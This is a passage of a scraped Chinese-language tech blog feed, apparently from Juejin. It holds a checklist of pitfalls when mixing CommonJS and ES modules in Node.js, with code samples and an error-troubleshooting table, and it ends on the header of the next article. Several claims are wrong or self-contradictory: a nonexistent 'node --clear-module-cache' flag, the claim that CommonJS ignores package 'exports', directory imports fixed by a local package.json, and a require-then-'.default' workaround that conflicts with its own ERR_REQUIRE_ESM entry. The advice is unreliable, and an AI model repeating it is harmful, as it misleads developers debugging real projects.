                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-estuary-light">.hljs-comment,.hljs-quote{color:#6c6b5a}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ba6236}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#ae7313}.hljs-bullet,.hljs-string,.hljs-symbol{color:#7d9726}.hljs-section,.hljs-title{color:#36a166}.hljs-keyword,.hljs-selector-tag{color:#5f9182}.hljs-addition,.hljs-deletion{color:#22221b;display:inline-block;width:100%}.hljs-deletion{background-color:#ba6236}.hljs-addition{background-color:#7d9726}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f4f3ec;color:#5f5e4e}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这份清单覆盖<strong>项目配置、模块导入导出、路径解析、第三方包兼容</strong>四大核心场景，为避开跨模块规范的常见问题。</p>
<h2 data-id="heading-0">一、 项目基础配置避坑</h2>
<ol>
<li><strong>明确模块类型，避免自动切换混乱</strong></li>
</ol>
<ul>
<li>
<ul>
<li>Node.js 默认 <code>.js</code> 文件为 CJS，若要全局启用 ESM，必须在项目根目录 <code>package.json</code> 中配置 <code>"type": "module"</code>。</li>
<li>若只想单个文件用 ESM，可将后缀改为 <code>.mjs</code>；单个文件用 CJS，后缀改为 <code>.cjs</code>（不受 <code>package.json</code> 的 <code>type</code> 影响）。</li>
<li>❌ 错误：项目根目录没配 <code>"type": "module"</code>，却在 <code>.js</code> 文件里写 <code>import/export</code> → 直接报错。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>package.json</code> <strong>字段优先级要分清</strong></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.cjs"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.cjs"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"import"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.mjs"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
<li>ESM 优先读取 <code>exports</code> 字段，CJS 优先读取 <code>main</code> 字段。</li>
<li>若要同时兼容 CJS 和 ESM，需在 <code>exports</code> 中分别声明：</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">二、 模块导入导出避坑</h2>
<ol>
<li><strong>CJS 不能直接</strong> <code>require()</code> <strong>ESM 模块</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// CJS 文件中加载 ESM 模块</span>
<span class="hljs-keyword">import</span>(<span class="hljs-string">'./esm-file.js'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>); <span class="hljs-comment">// 拿到 ESM 的默认导出</span>
});
</code></pre>
<ul>
<li>
<ul>
<li>❌ 错误：<code>const esmModule = require('./esm-file.js')</code>（该文件是 ESM 格式）→ 报 <code>ERR_REQUIRE_ESM</code>。</li>
<li>✅ 解决：用 <code>import()</code> 动态导入（返回 Promise）：</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>ESM 加载 CJS 模块的注意事项</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ESM 文件中加载 CJS 模块</span>
<span class="hljs-keyword">import</span> cjsModule <span class="hljs-keyword">from</span> <span class="hljs-string">'./cjs-file.js'</span>;
<span class="hljs-comment">// 等价于 CJS 的 const cjsModule = require('./cjs-file.js')</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 方案1：解构默认导出</span>
<span class="hljs-keyword">import</span> cjsModule <span class="hljs-keyword">from</span> <span class="hljs-string">'./cjs-file.js'</span>;
<span class="hljs-keyword">const</span> { foo } = cjsModule;

<span class="hljs-comment">// 方案2：CJS 模块兼容具名导出写法</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }; <span class="hljs-comment">// ESM 可解构</span>
</code></pre>
<ul>
<li>
<ul>
<li>✅ ESM 可以直接用 <code>import</code> 加载 CJS 模块，CJS 的 <code>module.exports</code> 会被视为 ESM 的默认导出。</li>
<li>❌ 坑：CJS 模块没有 ESM 的具名导出，不能写 <code>import { foo } from './cjs-file.js'</code> → 导入的 <code>foo</code> 为 <code>undefined</code>。</li>
<li>✅ 解决：要么解构默认导出，要么让 CJS 模块兼容导出：</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>__dirname</code> <strong>/</strong> <code>__filename</code> <strong>在 ESM 中不可用</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ESM 中替代 __dirname/__filename</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>;
<span class="hljs-keyword">import</span> { dirname } <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;

<span class="hljs-keyword">const</span> __filename = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);
<span class="hljs-keyword">const</span> __dirname = <span class="hljs-title function_">dirname</span>(__filename);
</code></pre>
<ul>
<li>
<ul>
<li>CJS 中的 <code>__dirname</code>（当前文件目录路径）、<code>__filename</code>（当前文件路径）在 ESM 中被移除。</li>
<li>❌ 错误：在 ESM 文件中直接用 <code>__dirname</code> → 报 <code>ReferenceError</code>。</li>
<li>✅ 解决：用 <code>import.meta.url</code> 手动实现：</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">三、 路径解析避坑</h2>
<ol>
<li><strong>ESM 必须写全文件扩展名</strong></li>
</ol>
<ul>
<li>
<ul>
<li>这是最容易踩的坑！CJS 支持省略 <code>.js</code>/<code>.json</code>，ESM 不行。</li>
<li>❌ 错误：<code>import helper from './utils/helper'</code> → 报 <code>ERR_MODULE_NOT_FOUND</code>。</li>
<li>✅ 正确：<code>import helper from './utils/helper.js'</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>ESM 加载目录必须配置</strong> <code>exports</code></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./index.js"</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 映射目录根到 index.js</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
<li>CJS 加载目录时，会自动找 <code>index.js</code>；ESM 不会，必须在目录的 <code>package.json</code> 中配置 <code>exports</code>。</li>
<li>示例：<code>utils</code> 目录下加 <code>package.json</code></li>
<li>之后才能在 ESM 中这样写：<code>import utils from './utils'</code>。</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>第三方包的路径映射优先看</strong> <code>exports</code></li>
</ol>
<ul>
<li>
<ul>
<li>若第三方包的 <code>package.json</code> 有 <code>exports</code> 字段，ESM 会严格按其规则加载，不能“越级”导入子文件。</li>
<li>❌ 错误：包 <code>my-pkg</code> 的 <code>exports</code> 只暴露了根，却写 <code>import foo from 'my-pkg/src/foo.js'</code> → 报错。</li>
<li>✅ 解决：要么让包在 <code>exports</code> 中添加该路径，要么用 CJS 加载（CJS 不受 <code>exports</code> 限制）。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">四、 命令行运行与工具链避坑</h2>
<ol>
<li><strong>运行 ESM 文件的参数注意</strong></li>
</ol>
<ul>
<li>
<ul>
<li>若没配置 <code>package.json</code> 的 <code>"type": "module"</code>，运行 <code>.mjs</code> 文件无需额外参数；运行 <code>.js</code> 文件需加 <code>--experimental-modules</code>（低版本 Node），高版本 Node（v14.3+）无需。</li>
<li>命令示例：<code>node esm-file.js</code>（已配 <code>type: module</code>）、<code>node esm-file.mjs</code>（无需配置）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>TypeScript/打包工具的兼容设置</strong></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"moduleResolution"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NodeNext"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 匹配 Node.js 的 ESM 解析规则</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 兼容 CJS 模块的默认导出</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
<li>用 <code>tsc</code> 编译时，若目标是 ESM，需在 <code>tsconfig.json</code> 中设置：</li>
<li>用 <code>webpack/rollup</code> 时，需明确配置 <code>output.format</code> 为 <code>cjs</code> 或 <code>esm</code>，避免打包后模块类型混乱。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-4">五、CJS &amp; ESM 混合项目常见错误排查对照表</h2>
<p>这份对照表覆盖 Demo 运行中最容易出现的 8 类报错，包含 <strong>错误现象、根本原因、解决方案</strong>，帮你快速定位和修复问题。</p>



























































<table><thead><tr><th>错误类型</th><th>错误提示示例</th><th>根本原因</th><th>解决方案</th></tr></thead><tbody><tr><td><strong>ESM 扩展名缺失</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './esm-helper' imported from ...</code></td><td>ESM 要求必须写全文件扩展名（<code>.js</code>/<code>.mjs</code>），不能像 CJS 那样省略</td><td>在 <code>import</code> 语句中补全扩展名，例如： <code>import helper from './esm-helper.js'</code></td></tr><tr><td><strong>CJS 直接加载 ESM</strong></td><td><code>Error [ERR_REQUIRE_ESM]: require() of ES Module ... not supported.</code></td><td>CJS 的 <code>require()</code> 不支持直接加载 ESM 模块，只能加载 CJS 模块</td><td>改用 ESM 的动态 <code>import()</code> 函数（返回 Promise）： <code>import('./esm-module.js').then(mod =&gt; { ... })</code></td></tr><tr><td><strong>ESM 加载目录无 exports</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './utils' imported from ...</code></td><td>ESM 加载目录时，不会默认找 <code>index.js</code>，必须配置目录的 <code>package.json</code> <code>exports</code> 字段</td><td>在 <code>utils</code> 目录下新建 <code>package.json</code>，添加： <code>{ "exports": { ".": "./index.js" } }</code></td></tr><tr><td><strong>__dirname 未定义</strong></td><td><code>ReferenceError: __dirname is not defined in ES module scope</code></td><td>ESM 中移除了 <code>__dirname</code>/<code>__filename</code> 全局变量</td><td>用 <code>import.meta.url</code> 手动实现，参考 <code>esm-dirname.js</code> 的代码</td></tr><tr><td><strong>type: module 冲突</strong></td><td><code>SyntaxError: Cannot use import statement outside a module</code></td><td>根目录 <code>package.json</code> 没配置 <code>"type": "module"</code>，<code>.js</code> 文件被当作 CJS 解析</td><td>在根 <code>package.json</code> 中添加： <code>{ "type": "module" }</code>，或把 ESM 文件后缀改为 <code>.mjs</code></td></tr><tr><td><strong>第三方包 exports 限制</strong></td><td><code>Error [ERR_PACKAGE_PATH_NOT_EXPORTED]: Package subpath './src/xxx' is not defined by "exports"</code></td><td>第三方包的 <code>package.json</code> <code>exports</code> 字段未暴露该子路径，ESM 严格遵循映射规则</td><td>1. 改用包暴露的合法路径； 2. 若为自己开发的包，在 <code>exports</code> 中添加该路径映射</td></tr><tr><td><strong>CJS 解构 ESM 具名导出失败</strong></td><td><code>const { foo } = require('./esm-module.js')</code> → <code>foo</code> 为 <code>undefined</code></td><td>ESM 的具名导出不能被 CJS 直接解构，<code>require()</code> 只能拿到 ESM 的默认导出</td><td>先获取默认导出再解构： <code>const mod = require('./esm-module.js'); const { foo } = mod.default;</code></td></tr><tr><td><strong>文件路径大小写问题</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './Esm-Helper.js'</code></td><td>Node.js 路径解析区分大小写（尤其是 Linux/macOS 系统）</td><td>保证 <code>import</code> 路径的大小写和实际文件名完全一致</td></tr></tbody></table>
<h2 data-id="heading-5">六、额外通用排查技巧</h2>
<ol>
<li><strong>检查 Node.js 版本</strong>：确保 Node.js ≥ v14.3.0，低版本对 ESM 支持不完善。</li>
<li><strong>清理缓存</strong>：运行 <code>node --clear-module-cache src/xxx.js</code> 清除模块缓存，解决缓存导致的解析异常。</li>
<li><strong>绝对路径测试</strong>：若相对路径报错，改用绝对路径（结合 <code>__dirname</code>）测试，排除相对路径层级错误。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 中 ==、===、Object.is 以及 null、undefined、undeclared 的区别]]></title>    <link>https://juejin.cn/post/7592593491861848064</link>    <guid>https://juejin.cn/post/7592593491861848064</guid>    <pubDate>2026-01-08T09:57:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592593491861848064" data-draft-id="7592593491861831680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 中 ==、===、Object.is 以及 null、undefined、undeclared 的区别"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T09:57:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途潇潇"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 中 ==、===、Object.is 以及 null、undefined、undeclared 的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途潇潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:57:46.000Z" title="Thu Jan 08 2026 09:57:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
